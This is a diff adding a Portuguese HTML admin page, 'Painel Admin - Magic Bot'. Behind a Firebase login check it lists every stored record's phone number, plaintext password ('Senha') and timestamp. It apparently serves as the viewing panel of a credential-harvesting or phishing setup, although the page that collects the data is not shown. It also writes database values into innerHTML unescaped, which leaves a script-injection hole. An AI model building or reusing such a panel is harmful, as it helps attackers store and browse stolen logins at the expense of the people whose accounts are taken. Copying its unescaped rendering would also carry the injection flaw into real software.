@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>Painel Admin - Magic Bot</title>
+
+<style>
+
+body{
+    font-family:Arial,sans-serif;
+    background:#f2f2f2;
+    padding:20px;
+}
+
+h1{
+    text-align:center;
+}
+
+h3{
+    text-align:center;
+    color:#333;
+}
+
+button{
+    padding:10px 20px;
+    cursor:pointer;
+    margin-bottom:15px;
+}
+
+table{
+    width:100%;
+    background:white;
+    border-collapse:collapse;
+}
+
+th,td{
+    border:1px solid #ccc;
+    padding:10px;
+    text-align:center;
+}
+
+th{
+    background:#222;
+    color:white;
+}
+
+</style>
+
+</head>
+
+<body>
+
+<h1>📊 Painel Admin Magic Bot</h1>
+
+<h3>Total de Registros: <span id="total">0</span></h3>
+
+<button onclick="sair()">Sair</button>
+
+<table>
+
+<thead>
+
+<tr>
+
+<th>Número</th>
+
+<th>Senha</th>
+
+<th>Data e Hora</th>
+
+</tr>
+
+</thead>
+
+<tbody id="dados">
+
+</tbody>
+
+</table>
+
+
+<script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script>
+
+<script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-database-compat.js"></script>
+
+<script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-auth-compat.js"></script>
+
+<script src="firebase.js"></script>
+
+<script>
+
+// Verificar login
+
+firebase.auth().onAuthStateChanged((user)=>{
+
+    if(!user){
+
+        window.location.href="login.html";
+
+    }
+
+});
+
+const tabela=document.getElementById("dados");
+
+const total=document.getElementById("total");
+
+db.ref("usuarios").on("value",(snapshot)=>{
+
+    tabela.innerHTML="";
+
+    let contador=0;
+
+    snapshot.forEach((item)=>{
+
+        contador++;
+
+        const dados=item.val();
+
+        tabela.innerHTML +=`
+
+        <tr>
+
+        <td>${dados.numero}</td>
+
+        <td>${dados.senha}</td>
+
+        <td>${dados.dataHora || "-"}</td>
+
+        </tr>
+
+        `;
+
+    });
+
+    total.innerHTML=contador;
+
+});
+
+function sair(){
+
+    firebase.auth().signOut().then(()=>{
+
+        window.location.href="login.html";
+
+    });
+
+}
+
+</script>
+
+</body>
+</html>
